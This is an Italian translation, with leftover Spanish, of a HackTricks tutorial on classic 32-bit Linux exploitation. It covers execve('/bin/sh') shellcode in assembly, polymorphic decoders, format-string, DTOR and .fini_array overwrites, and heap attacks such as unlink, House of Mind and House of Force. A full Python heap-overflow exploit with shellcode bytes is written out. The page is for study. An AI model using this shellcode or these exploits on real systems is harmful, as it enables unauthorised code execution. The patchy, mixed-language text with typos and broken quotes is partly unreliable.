# Linux Exploiting (Basic) (ITA)

<details>

<summary><strong>Impara l'hacking su AWS da zero a ero con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

## **2.SHELLCODE**

Ver interrupciones de kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; limpiamos eax\
xor ebx, ebx ; ebx = 0 pues no hay argumento que pasar\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Ejecutar syscall

**nasm -f elf assembly.asm** ‚Äî> Nos devuelve un .o\
**ld assembly.o -o shellcodeout** ‚Äî> Nos da un ejecutable formado por el c√≥digo ensamblador y podemos sacar los opcodes con **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Para ver que efectivamente es nuestra shellcode y sacar los OpCodes

**Comprobar que la shellcode funciona**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Per verificare che le system call vengano eseguite correttamente, √® necessario compilare il programma precedente e le system call dovrebbero apparire in **strace ./PROGRAMMA_COMPILATO**

Quando si creano shellcode, si pu√≤ utilizzare un trucco. La prima istruzione √® un salto a una chiamata. La chiamata richiama il codice originale e inserisce l'EIP nello stack. Dopo l'istruzione di chiamata, abbiamo inserito la stringa di cui avevamo bisogno, quindi con quel EIP possiamo puntare alla stringa e continuare ad eseguire il codice.

ESEMPIO **TRICK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**Esempio di utilizzo dello Stack(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Cacciatore di Uova:**

Si tratta di un piccolo codice che scorre le pagine di memoria associate a un processo alla ricerca della shellcode ivi memorizzata (cerca una firma inserita nella shellcode). Utile nei casi in cui si dispone solo di uno spazio limitato per iniettare codice.

**Shellcode Polimorfiche**

Sono shell cifrate che contengono un piccolo codice che le decifra e salta ad esso, utilizzando il trucco di Call-Pop, questo sarebbe un **esempio di cifratura di Cesare**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5. Metodi complementari**

**Ret2Ret**

Utile quando non √® possibile inserire un indirizzo dello stack nell'EIP (verificando che l'EIP non contenga 0xbf) o quando non √® possibile calcolare la posizione della shellcode. Tuttavia, la funzione vulnerabile accetta un parametro (la shellcode andr√† qui).

In questo modo, cambiando l'EIP con un indirizzo a un **ret**, verr√† caricato il prossimo indirizzo (che √® l'indirizzo del primo argomento della funzione). In altre parole, verr√† caricata la shellcode.

L'exploit sarebbe: SHELLCODE + Riempimento (fino a EIP) + **\&ret** (i byte successivi nello stack puntano all'inizio della shellcode poich√© viene inserito nello stack l'indirizzo del parametro passato)

Sembra che funzioni come **strncpy** una volta completate eliminino dalla pila l'indirizzo in cui era memorizzata la shellcode, impedendo questa tecnica. In altre parole, l'indirizzo passato alla funzione come argomento (quello che memorizza la shellcode) viene modificato con un 0x00, quindi quando viene chiamato il secondo **ret** si trova un 0x00 e il programma si interrompe.



**Tecnica di Murat**

In Linux, tutti i programmi vengono mappati a partire da 0xbfffffff

Guardando come viene costruito lo stack di un nuovo processo in Linux, √® possibile sviluppare un exploit in modo che il programma venga avviato in un ambiente in cui l'unica variabile sia la shellcode. L'indirizzo di questa variabile pu√≤ quindi essere calcolato come: addr = 0xbfffffff - 4 - strlen(NOME\_eseguibile\_completo) - strlen(shellcode)

In questo modo si otterrebbe facilmente l'indirizzo in cui si trova la variabile di ambiente con la shellcode.

Questo √® possibile grazie alla funzione execle che consente di creare un ambiente con solo le variabili di ambiente desiderate

**Integer overflows**

Questo tipo di overflow si verifica quando una variabile non √® pronta per gestire un numero cos√¨ grande come quello passato, possibilmente a causa di una confusione tra variabili con e senza segno, ad esempio:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Nell'esempio precedente vediamo che il programma si aspetta 2 parametri. Il primo √® la lunghezza della stringa successiva e il secondo √® la stringa.

Se passiamo un numero negativo come primo parametro, verr√† visualizzato che len < 256 e passeremo quel filtro, e inoltre anche strlen(buffer) sar√† minore di l, poich√© l √® unsigned int e sar√† molto grande.

Questo tipo di overflow non cerca di scrivere qualcosa nel processo del programma, ma di superare filtri mal progettati per sfruttare altre vulnerabilit√†.

**Variabili non inizializzate**

Non si conosce il valore che una variabile non inizializzata potrebbe assumere ed √® interessante osservarlo. Potrebbe assumere il valore che aveva una variabile della funzione precedente e questa potrebbe essere controllata dall'attaccante.

##

###

###

###

### **.fini\_array**

Essenzialmente si tratta di una struttura con **funzioni che verranno chiamate** prima che il programma finisca. Questo √® interessante se puoi chiamare il tuo **shellcode saltando a un indirizzo**, o nei casi in cui devi tornare di nuovo a main per **sfruttare nuovamente la stringa di formato**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Nota che questo **non** creer√† un **loop eterno** perch√© quando torni a main il canary si accorger√†, la fine dello stack potrebbe essere corrotta e la funzione non verr√† richiamata di nuovo. Quindi con questo sarai in grado di **avere 1 esecuzione in pi√π** della vulnerabilit√†.

### **Formattare le stringhe per scaricare il contenuto**

Una stringa di formato pu√≤ anche essere abusata per **scaricare il contenuto** dalla memoria del programma.\
Ad esempio, nella seguente situazione c'√® una **variabile locale nello stack che punta a una flag**. Se **trovi** dove in **memoria** si trova il **puntatore** alla **flag**, puoi fare in modo che **printf acceda** a quell'**indirizzo** e stampi la **flag**:

Quindi, la flag √® in **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

E dal leak puoi vedere che il **puntatore alla flag** √® nel **8¬∞** parametro:

![](<../../.gitbook/assets/image (623).png>)

Quindi, **accedendo** all'**8¬∞ parametro** puoi ottenere la flag:

![](<../../.gitbook/assets/image (624).png>)

Nota che seguendo l'**exploit precedente** e rendendoti conto che puoi **scaricare il contenuto**, puoi **impostare i puntatori** a **`printf`** nella sezione in cui l'**eseguibile** √® **caricato** e **scaricarlo** **interamente**!

### **DTOR**

{% hint style="danger" %}
Oggi √® molto **strano trovare un binario con una sezione dtor**.
{% endhint %}

I distruttori sono funzioni che vengono **eseguite prima che il programma finisca**.\
Se riesci a **scrivere** un **indirizzo** in un **shellcode** in **`__DTOR_END__`**, questo verr√† **eseguito** prima della fine dei programmi.\
Ottieni l'indirizzo di questa sezione con:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
Di solito troverai la sezione **DTOR** **tra** i valori `ffffffff` e `00000000`. Quindi se vedi solo quei valori, significa che **non c'√® alcuna funzione registrata**. Quindi **sovrascrivi** il **`00000000`** con l'**indirizzo** dello **shellcode** per eseguirlo.

### **Stringhe di Formato per Buffer Overflows**

La funzione **sprintf** sposta una stringa formattata **in** una **variabile**. Quindi potresti abusare della **formattazione** di una stringa per causare un **buffer overflow nella variabile** in cui il contenuto viene copiato.\
Ad esempio, il payload `%.44xAAAA` scriver√† **44B+"AAAA" nella variabile**, il che potrebbe causare un buffer overflow.

### **Strutture \_\_atexit**

{% hint style="danger" %}
Oggi √® molto **strano sfruttare questo**.
{% endhint %}

**`atexit()`** √® una funzione a cui vengono passate **altre funzioni come parametri**. Queste **funzioni** verranno **eseguite** durante l'esecuzione di un **`exit()`** o al **ritorno** dal **main**.\
Se riesci a **modificare** l'**indirizzo** di una qualsiasi di queste **funzioni** in modo che punti a uno shellcode, ad esempio, otterrai il **controllo** del **processo**, ma attualmente √® pi√π complicato.\
Attualmente gli **indirizzi delle funzioni** da eseguire sono **nascosti** dietro diverse strutture e infine l'indirizzo a cui puntano non sono gli indirizzi delle funzioni, ma sono **criptati con XOR** e spostamenti con una **chiave casuale**. Quindi attualmente questo vettore di attacco non √® molto utile almeno su x86 e x64\_86.\
La funzione di **criptazione** √® **`PTR_MANGLE`**. Altre architetture come m68k, mips32, mips64, aarch64, arm, hppa... **non implementano la funzione di crittografia** perch√© **restituisce lo stesso** che ha ricevuto in input. Quindi queste architetture potrebbero essere attaccabili tramite questo vettore.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Oggi √® molto **strano sfruttare questo**.
{% endhint %}

**`Setjmp()`** consente di **salvare** il **contesto** (i registri)\
**`longjmp()`** consente di **ripristinare** il **contesto**.\
I **registri salvati** sono: `EBX, ESI, EDI, ESP, EIP, EBP`\
Quello che succede √® che EIP e ESP vengono passati dalla funzione **`PTR_MANGLE`**, quindi le **architetture vulnerabili a questo attacco sono le stesse di prima**.\
Sono utili per il recupero degli errori o gli interrupt.\
Tuttavia, da quanto ho letto, gli altri registri non sono protetti, **quindi se c'√® una `call ebx`, `call esi` o `call edi`** all'interno della funzione chiamata, √® possibile prendere il controllo. Oppure potresti anche modificare EBP per modificare ESP.

**VTable e VPTR in C++**

Ogni classe ha una **Vtable** che √® un array di **puntatori a metodi**.

Ogni oggetto di una **classe** ha un **VPtr** che √® un **puntatore** all'array della sua classe. Il VPtr fa parte dell'intestazione di ogni oggetto, quindi se si riesce a **sovrascrivere** il **VPtr** potrebbe essere **modificato** per **puntare** a un metodo fittizio in modo che l'esecuzione di una funzione vada allo shellcode.

## **Misure Preventive ed Evasioni**

###

**Sostituzione di Libsafe**

Attivato con: LD\_PRELOAD=/lib/libsafe.so.2\
o\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Le chiamate a alcune funzioni non sicure vengono intercettate e sostituite con altre sicure. Non standardizzato. (solo per x86, non per compilazioni con -fomit-frame-pointer, non compilazioni statiche, non tutte le funzioni vulnerabili diventano sicure e LD\_PRELOAD non funziona con binari con setuid).

**Spazio degli Indirizzi ASCII Armored**

Consiste nel caricare le librerie condivise da 0x00000000 a 0x00ffffff in modo che ci sia sempre un byte 0x00. Tuttavia, questo non ferma praticamente nessun attacco, specialmente in little endian.

**ret2plt**

Consiste nell'eseguire un ROP in modo che si chiami la funzione strcpy@plt (dalla plt) e si punti all'ingresso della GOT e si copi il primo byte della funzione che si vuole chiamare (system()). Successivamente si fa lo stesso puntando a GOT+1 e si copia il secondo byte di system()... Alla fine si chiama l'indirizzo salvato in GOT che sar√† system()

**Jail con chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Installa un sistema di base in una directory specifica

Un amministratore pu√≤ uscire da una di queste prigioni facendo: mkdir foo; chroot foo; cd ..

**Strumentazione del Codice**

Valgrind ‚Äî> Cerca errori\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Exploits di Base**

**Chunk Assegnato**

prev\_size |\
size | ‚ÄîHeader\
\*mem | Dati

**Chunk Libero**

prev\_size |\
size |\
\*fd | Ptr chunk successivo\
\*bk | Ptr chunk precedente ‚ÄîHeader\
\*mem | Dati

I chunk liberi sono in una lista doppiamente collegata (bin) e non possono mai essere due chunk liberi consecutivi (vengono uniti)

In "size" ci sono bit per indicare: se il chunk precedente √® in uso, se il chunk √® stato assegnato tramite mmap() e se il chunk appartiene all'arena primaria.

Quando si libera un chunk e uno dei chunk adiacenti √® libero, questi vengono fusi tramite la macro unlink() e il nuovo chunk pi√π grande viene passato a frontlink() per inserirlo nel bin appropriato.

unlink(){\
BK = P->bk; ‚Äî> Il BK del nuovo chunk √® quello che aveva il chunk precedentemente libero\
FD = P->fd; ‚Äî> Il FD del nuovo chunk √® quello che aveva il chunk precedentemente libero\
FD->bk = BK; ‚Äî> Il BK del chunk successivo punta al nuovo chunk\
BK->fd = FD; ‚Äî> Il FD del chunk precedente punta al nuovo chunk\
}

Quindi se riusciamo a modificare P->bk con l'indirizzo di uno shellcode e P->fd con l'indirizzo di un'entrata nella GOT o DTORS meno 12, si ottiene:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

E cos√¨, al termine del programma, lo shellcode viene eseguito.

Inoltre, la quarta istruzione di unlink() scrive qualcosa e lo shellcode deve essere preparato per questo:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Questo provoca la scrittura di 4 byte a partire dall'8¬∞ byte dello shellcode, quindi la prima istruzione dello shellcode deve essere un jmp per saltare questo e passare a dei nop che portano al resto dello shellcode.

Quindi l'exploit viene creato:

Nel buffer1 inseriamo lo shellcode iniziando con un jmp in modo che passi ai nop o al resto dello shellcode.

Dopo lo shellcode inseriamo del riempimento fino a raggiungere il campo prev\_size e size del chunk successivo. In questi punti inseriamo 0xfffffff0 (per sovrascrivere prev\_size in modo che abbia il bit che indica che √® libero) e "-4" (0xfffffffc) in size (per far credere al terzo chunk che il secondo era libero quando in realt√† va al prev\_size modificato che dir√† che √® libero) -> Cos√¨ quando free() controlla, va al size del terzo ma in realt√† va al secondo - 4 e pensa che il secondo chunk sia libero. Quindi chiama **unlink()**.

Chiamando unlink() user√† come P->fd i primi dati del secondo chunk, quindi l√¨ verr√† inserito l'indirizzo da sovrascrivere - 12 (poich√© in FD->bk sommer√† 12 all'indirizzo memorizzato in FD). E in quell'indirizzo verr√† inserito il secondo indirizzo trovato nel secondo chunk, che ci interesser√† che sia l'indirizzo dello shellcode (falso P->bk).
**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes di riempimento**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #√à importante che il bit che indica che il chunk precedente √® libero sia 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, in modo che pensi che il "size" del 3¬∫ chunk sia 4 byte indietro (punta a prev\_size) dove controlla se il 2¬∫ chunk √® libero**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Nel payload all'inizio mettiamo 8 byte di riempimento**

**got\_free = pack("\<I", 0x08048300 - 12) #Indirizzo di free() nella plt-12 (sar√† sovrascritto per eseguire lo shellcode la seconda volta che viene chiamato free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Come detto, il payload inizia con 8 byte di riempimento**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Si modifica il 2¬∫ chunk, got\_free punta dove salveremo l'indirizzo addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando in senso inverso (wargame)**

Stiamo controllando 3 chunk consecutivi e vengono liberati in ordine inverso alla loro allocazione.

In questo caso:

Nel chunk c viene inserito lo shellcode

Il chunk a viene utilizzato per sovrascrivere il b in modo che il bit PREV\_INUSE del size sia disattivato, facendo credere che il chunk a sia libero.

Inoltre, viene sovrascritto il size nell'header di b in modo che valga -4.

Cos√¨, il programma penser√† che "a" sia libero e in un bin, quindi chiamer√† unlink() per disconnetterlo. Tuttavia, poich√© l'header PREV\_SIZE vale -4, penser√† che il chunk "a" inizi effettivamente in b+4. In altre parole, eseguir√† un unlink() su un chunk che inizia in b+4, quindi in b+12 ci sar√† il puntatore "fd" e in b+16 ci sar√† il puntatore "bk".

In questo modo, se mettiamo l'indirizzo dello shellcode in bk e l'indirizzo della funzione "puts()" -12 in fd, otteniamo il nostro payload.

**Tecnica di Frontlink**

Frontlink viene chiamato quando viene liberato un chunk e nessuno dei suoi chunk adiacenti √® libero, non viene chiamato unlink() ma viene chiamato direttamente frontlink().

Vulnerabilit√† utile quando il malloc attaccato non viene mai liberato (free()).

Richiede:

Un buffer che pu√≤ essere sovrascritto con la funzione di input dei dati

Un buffer adiacente a questo che deve essere liberato e il cui campo fd dell'header verr√† modificato grazie al buffer precedente

Un buffer da liberare con una dimensione maggiore di 512 ma inferiore al buffer precedente

Un buffer dichiarato prima del passaggio 3 che consente di sovrascrivere il prev\_size di questo

In questo modo, sovrapponendo due malloc in modo incontrollato e uno in modo controllato ma che viene liberato solo una volta, possiamo creare uno sfruttamento.

**Vulnerabilit√† double free()**

Se free() viene chiamato due volte con lo stesso puntatore, ci saranno due bin che puntano allo stesso indirizzo.

Se si desidera riutilizzarne uno, non ci saranno problemi. Se si desidera utilizzarne un altro, verr√† assegnato lo stesso spazio, quindi avremo i puntatori "fd" e "bk" falsificati con i dati che la prenotazione precedente scriver√†.

**After free()**

Un puntatore precedentemente liberato viene riutilizzato senza controllo.

## **8 Heap Overflows: Exploits avanzati**

Le tecniche di Unlink() e FrontLink() sono state eliminate modificando la funzione unlink().

**The house of mind**

√à necessaria solo una chiamata a free() per eseguire del codice arbitrario. √à importante trovare un secondo chunk che pu√≤ essere sovrascritto da uno precedente e liberato.

Una chiamata a free() comporta una chiamata a public\_fREe(mem), che fa:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Restituisce un puntatore all'indirizzo in cui inizia il chunk (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

In \[1] controlla il campo size del bit NON\_MAIN\_ARENA, che pu√≤ essere alterato in modo che il controllo restituisca true ed esegua heap\_for\_ptr() che effettua un and a "mem" ponendo a 0 i 2,5 byte meno significativi (nel nostro caso da 0x0804a000 a 0x08000000) e accede a 0x08000000->ar\_ptr (come se fosse una struct heap\_info)

In questo modo, se possiamo controllare un chunk ad esempio in 0x0804a000 e verr√† liberato un chunk in **0x081002a0** possiamo raggiungere l'indirizzo 0x08100000 e scrivere ci√≤ che vogliamo, ad esempio **0x0804a000**. Quando verr√† liberato questo secondo chunk, trover√† che heap\_for\_ptr(ptr)->ar\_ptr restituir√† ci√≤ che abbiamo scritto in 0x08100000 (poich√© si applica a 0x081002a0 l'and che abbiamo visto prima e da l√¨ si ottiene il valore dei primi 4 byte, ar\_ptr)

Quindi viene chiamato \_int\_free(ar\_ptr, mem), cio√® **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Come abbiamo visto prima, possiamo controllare il valore di av, poich√© √® ci√≤ che scriviamo nel chunk che verr√† liberato.

Come √® definito unsorted\_chunks, sappiamo che:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Pertanto, se scriviamo il valore di \_\_DTOR\_END\_\_-12 in av->bins\[2], nell'ultima istruzione verr√† scritto in \_\_DTOR\_END\_\_ l'indirizzo del secondo chunk.

In altre parole, nel primo chunk dobbiamo inserire all'inizio molte volte l'indirizzo di \_\_DTOR\_END\_\_-12 perch√© av->bins\[2\] lo prender√† da l√¨

Nell'indirizzo in cui cade l'indirizzo del secondo chunk con gli ultimi 5 zeri, dobbiamo scrivere l'indirizzo di questo primo chunk in modo che heap\_for\_ptr() pensi che ar\_ptr sia all'inizio del primo chunk e prenda av->bins\[2\]

Nel secondo chunk e grazie al primo sovrascriviamo il prev\_size con un salto 0x0c e il size con qualcosa per attivare -> NON\_MAIN\_ARENA

Successivamente, nel chunk 2 inseriamo molti nops e infine lo shellcode

In questo modo verr√† chiamato \_int\_free(CHUNK1, CHUNK2) e seguir√† le istruzioni per scrivere in \_\_DTOR\_END\_\_ l'indirizzo del prev\_size del CHUNK2 che salter√† allo shellcode.
Per applicare questa tecnica sono necessari alcuni requisiti che complicano un po' di pi√π il payload.

Questa tecnica non √® pi√π applicabile poich√© √® stato applicato quasi lo stesso patch di unlink. Si confrontano se il nuovo sito a cui si punta sta puntando anche a lui.

**Fastbin**

√à una variante di The house of mind

ci interessa eseguire il codice successivo che si raggiunge dopo la prima verifica della funzione \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Essendo fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

In questo modo, se viene messo in "fb" d√† l'indirizzo di una funzione nella GOT, in questo indirizzo verr√† messo l'indirizzo del pezzo sovrascritto. Per fare ci√≤ sar√† necessario che l'arena sia vicina agli indirizzi di dtors. Pi√π precisamente, av->max\_fast deve essere all'indirizzo che stiamo sovrascrivendo.

Dato che con The House of Mind abbiamo visto che controllavamo la posizione di av.

Quindi se nel campo size mettiamo una dimensione di 8 + NON\_MAIN\_ARENA + PREV\_INUSE ‚Äî> fastbin\_index() ci restituir√† fastbins\[-1\], che punter√† a av->max\_fast

In questo caso av->max\_fast sar√† l'indirizzo che verr√† sovrascritto (non a cui punta, ma quella posizione verr√† sovrascritta).

Inoltre, deve essere soddisfatto che il pezzo adiacente a quello liberato deve essere maggiore di 8 -> Dato che abbiamo detto che la dimensione del pezzo liberato √® 8, in questo falso pezzo dobbiamo solo mettere una dimensione maggiore di 8 (inoltre, poich√© la shellcode sar√† nel pezzo liberato, all'inizio dovremo mettere un jmp che cade in nops).

Inoltre, lo stesso falso pezzo deve essere minore di av->system\_mem. av->system\_mem si trova a 1848 byte di distanza.

A causa dei nulli di \_DTOR\_END\_ e delle poche direzioni nella GOT, nessuna direzione di queste sezioni √® adatta per essere sovrascritta, quindi vediamo come applicare fastbin per attaccare lo stack.

Un altro modo di attacco √® di reindirizzare il **av** verso lo stack.

Se modifichiamo la dimensione in modo che sia 16 invece di 8 allora: fastbin\_index() ci restituir√† fastbins\[0\] e possiamo usare questo per sovrascrivere lo stack.

Per fare ci√≤ non deve esserci alcun canary o valori strani nello stack, infatti dobbiamo trovarci in questo: 4byte nulli + EBP + RET

I 4 byte nulli sono necessari affinch√© il **av** sia a questo indirizzo e il primo elemento di un **av** √® il mutex che deve valere 0.

Il **av->max\_fast** sar√† l'EBP e sar√† un valore che ci permetter√† di saltare le restrizioni.

Nel **av->fastbins\[0\]** verr√† sovrascritto con l'indirizzo di **p** e sar√† il RET, cos√¨ si salter√† alla shellcode.

Inoltre, in **av->system\_mem** (1484 byte sopra la posizione nello stack) ci sar√† abbastanza spazzatura che ci permetter√† di saltare il controllo che viene eseguito.

Inoltre, deve essere soddisfatto che il pezzo adiacente a quello liberato deve essere maggiore di 8 -> Dato che abbiamo detto che la dimensione del pezzo liberato √® 16, in questo falso pezzo dobbiamo solo mettere una dimensione maggiore di 8 (inoltre, poich√© la shellcode sar√† nel pezzo liberato, all'inizio dovremo mettere un jmp che cade in nops che vanno dopo il campo size del nuovo falso pezzo).

**The House of Spirit**

In questo caso cerchiamo di avere un puntatore a un malloc che possa essere modificato dall'attaccante (ad esempio, che il puntatore sia nello stack sotto un possibile overflow a una variabile).

In questo modo, potremmo fare in modo che questo puntatore punti dove vogliamo. Tuttavia, non qualsiasi posizione √® valida, la dimensione del pezzo falso deve essere minore di av->max\_fast e pi√π specificamente uguale alla dimensione richiesta in una futura chiamata a malloc()+8. Pertanto, se sappiamo che dopo questo puntatore vulnerabile viene chiamato malloc(40), la dimensione del pezzo falso deve essere uguale a 48.

Se ad esempio il programma chiedesse all'utente un numero potremmo inserire 48 e far puntare il puntatore di malloc modificabile ai successivi 4 byte (che potrebbero appartenere all'EBP con fortuna, cos√¨ il 48 rimane dietro, come se fosse l'intestazione size). Inoltre, l'indirizzo ptr-4+48 deve soddisfare diverse condizioni (essendo in questo caso ptr=EBP), cio√®, 8 < ptr-4+48 < av->system\_mem.

Nel caso in cui ci√≤ si verifichi, quando verr√† chiamato il successivo malloc che abbiamo detto essere malloc(40), verr√† assegnato come indirizzo l'indirizzo dell'EBP. Nel caso in cui l'attaccante possa anche controllare ci√≤ che viene scritto in questo malloc, pu√≤ sovrascrivere sia l'EBP che l'EIP con l'indirizzo desiderato.

Penso che ci√≤ sia perch√© quando verr√† liberato free() salver√† che nell'indirizzo che punta all'EBP dello stack c'√® un pezzo di dimensioni perfette per il nuovo malloc() che si vuole riservare, quindi assegner√† quell'indirizzo.

**The House of Force**

√à necessario:

* Un overflow a un pezzo che permetta di sovrascrivere il wilderness
* Una chiamata a malloc() con la dimensione definita dall'utente
* Una chiamata a malloc() i cui dati possono essere definiti dall'utente

La prima cosa da fare √® sovrascrivere la dimensione del pezzo wilderness con un valore molto grande (0xffffffff), quindi qualsiasi richiesta di memoria sufficientemente grande verr√† gestita in \_int\_malloc() senza la necessit√† di espandere l'heap

La seconda √® modificare av->top in modo che punti a una zona di memoria sotto il controllo dell'attaccante, come lo stack. In av->top verr√† messo \&EIP - 8.

Dobbiamo sovrascrivere av->top in modo che punti alla zona di memoria sotto il controllo dell'attaccante:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim raccoglie il valore dell'indirizzo del pezzo wilderness attuale (l'attuale av->top) e remainder √® esattamente la somma di quell'indirizzo pi√π la quantit√† di byte richiesti da malloc(). Quindi se \&EIP-8 √® in 0xbffff224 e av->top contiene 0x080c2788, allora la quantit√† che dobbiamo riservare nel malloc controllato affinch√© av->top punti a $EIP-8 per il prossimo malloc() sar√†:

0xbffff224 - 0x080c2788 = 3086207644.

Cos√¨ verr√† salvato in av->top il valore alterato e il prossimo malloc punter√† all'EIP e potr√† sovrascriverlo.

√à importante sapere che la dimensione del nuovo pezzo wilderness sia pi√π grande della richiesta fatta dall'ultimo malloc(). Cio√®, se il wilderness punta a \&EIP-8, la dimensione sar√† esattamente nel campo EBP dello stack.

**The House of Lore**

**Corruzione SmallBin**

